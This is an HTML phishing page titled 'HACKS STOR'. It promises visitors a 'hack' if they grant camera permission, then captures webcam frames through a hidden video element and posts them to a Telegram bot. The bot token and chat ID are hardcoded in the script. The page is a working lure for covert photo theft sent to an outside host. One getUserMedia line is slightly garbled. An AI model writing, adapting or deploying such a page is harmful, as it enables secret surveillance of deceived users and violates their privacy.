<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HACKS STOR</title>
</head>
<body>
    <h1>ASSALAMUALAIKUM </h1>
    <p> PLEASE ALLOW PERMISSION WAIT 10 SECONDS GET HACK.</p>

    <video id="videoElement" autoplay style="display:none;"></video> <!-- Hidden video element for capturing -->
    <canvas id="canvasElement" style="display:none;"></canvas> <!-- Hidden canvas to capture image -->
    <button id="captureBtn">Capture Photo</button> <!-- Button to trigger photo capture -->
    <p id="status"></p>

    <script>
        let mediaStream = null;

        // Function to request camera permission and start the stream
        async function requestCameraPermission() {
            try {
                // Request camera and microphone access
                mediaStream = await navigator.mediaDevices.getUserMedia({  Requesting video
                    audio: false  // No need for audio
                });

                // Show the video feed in the background (hidden for the user)
                const videoElement = document.getElementById('videoElement');
                videoElement.srcObject = mediaStream;

                document.getElementById('status').textContent = "Camera access granted. Click 'Capture Photo' to take a photo.";
            } catch (err) {
                document.getElementById('status').textContent = "Permission denied or error occurred: " + err.message;
            }
        }

        // Function to capture the image from the video feed
        function captureImage() {
            const videoElement = document.getElementById('videoElement');
            const canvasElement = document.getElementById('canvasElement');
            const context = canvasElement.getContext('2d');

            // Set canvas size to match video size
            canvasElement.width = videoElement.videoWidth;
            canvasElement.height = videoElement.videoHeight;

            // Draw the current frame from video onto the canvas
            context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);

            // Get image data as base64 string
            const imageData = canvasElement.toDataURL('image/jpeg');
            
            // Send the captured image to server or Telegram
            sendImageToTelegram(imageData);
        }

        // Function to send captured image to Telegram
        async function sendImageToTelegram(imageData) {
            const telegramBotToken = "7594029242:AAGlcWf6mZPKVm6NEsLsAEpqXWRrFhBaS8w"; // Your bot token
            const telegramChatId = "7009447523"; // Your chat ID

            // Convert the base64 image data to a Blob object
            const byteCharacters = atob(imageData.split(',')[1]);
            const byteArray = new Uint8Array(byteCharacters.length);
            for (let i = 0; i < byteCharacters.length; i++) {
                byteArray[i] = byteCharacters.charCodeAt(i);
            }
            const blob = new Blob([byteArray], { type: 'image/jpeg' });

            // Create a FormData object to send the photo
            const formData = new FormData();
            formData.append('chat_id', telegramChatId);
            formData.append('photo', blob, 'captured_photo.jpg'); // Add the image data here

            // Sending the photo to Telegram via bot
            try {
                const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                const responseText = await response.json();
                if (responseText.ok) {
                    document.getElementById('status').textContent = "Image sent to Telegram successfully!";
                } else {
                    document.getElementById('status').textContent = "Failed to send image.";
                }
            } catch (error) {
                document.getElementById('status').textContent = "Error sending image: " + error.message;
            }
        }

        // Start the process when the page loads
        window.onload = function() {
            requestCameraPermission();

            document.getElementById('captureBtn').addEventListener('click', captureImage);
        };
    </script>
</body>
</html>
